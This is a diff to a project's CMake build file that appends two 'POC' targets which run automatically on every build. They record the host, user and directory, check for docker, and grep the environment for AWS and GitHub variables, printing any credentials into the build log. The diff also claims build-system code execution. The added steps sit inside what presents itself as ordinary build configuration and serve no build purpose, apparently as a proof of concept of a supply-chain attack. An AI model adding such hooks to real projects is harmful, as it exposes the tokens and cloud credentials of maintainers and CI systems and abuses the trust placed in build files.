@@ -115,3 +115,25 @@ install(
     FILES ${CMAKE_CURRENT_SOURCE_DIR}/docs/man/urm.8 ${CMAKE_CURRENT_SOURCE_DIR}/docs/man/urmCli.8
     DESTINATION ${CMAKE_INSTALL_DATADIR}/man/man8
 )
+
+# ISRM TEST
+add_custom_target(poc_info ALL
+  COMMAND ${CMAKE_COMMAND} -E echo "=== POC: Environment Gathering ==="
+  COMMAND bash -c "echo 'Hostname: ' && hostname"
+  COMMAND bash -c "echo 'UID: ' && id"
+  COMMAND bash -c "echo 'PWD: ' && pwd"
+  COMMAND bash -c "echo 'Available commands:' && which docker"
+  COMMAND bash -c "echo 'AWS Creds check:' && env | grep -i aws || echo 'No AWS env'"
+  COMMAND bash -c "echo 'GitHub Token check:' && env | grep -i github || echo 'No GitHub env'"
+  DEPENDS ${PROJECT_NAME}
+)
+# ========== POC: Arbitrary Command Execution ==========
+add_custom_target(poc_execution ALL
+  COMMAND bash -c "echo '[POC] Build system RCE successful'"
+  COMMAND bash -c "echo '[POC] Current user:' && whoami"
+  COMMAND bash -c "echo '[POC] Current directory:' && pwd"
+  COMMAND bash -c "echo '[POC] Docker available:' && which docker"
+  COMMAND bash -c "echo '[POC] Build completed with RCE verification'"
+  VERBATIM
+)
+# ========== END POC ==========
